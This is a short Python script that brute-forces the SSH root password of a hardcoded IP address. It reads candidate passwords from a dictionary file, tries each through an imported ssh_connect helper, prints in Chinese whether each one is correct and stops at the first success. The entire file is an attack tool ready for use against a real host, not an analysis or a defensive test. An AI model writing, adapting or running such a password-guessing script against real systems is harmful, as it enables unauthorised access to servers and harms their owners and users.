#!/usr/bin/python3.4
# -*- coding=utf-8 -*-

import multiprocessing
from ssh import ssh_connect
import sys

def dos_ssh_root_passwd(ip,dict,user='root'):

	passwdfile = open(dict,'r').readlines()
	for passwd in passwdfile:
		ssh_list = [ip,passwd.strip(),user]
		ssh_result = ssh_connect(ssh_list) 
		if ssh_result[0] == 0:
			print('密码:' + ssh_result[1].strip() + '不正确')
		else:
			print('密码:' + ssh_result[1].strip() + '正确')
			print(ssh_result[2].strip())
			break

if __name__ == '__main__':
	import time
	t1 = time.time()
	dos_ssh_root_passwd('202.100.1.139','dict.txt','root')
	t2 = time.time()
	print(t2-t1)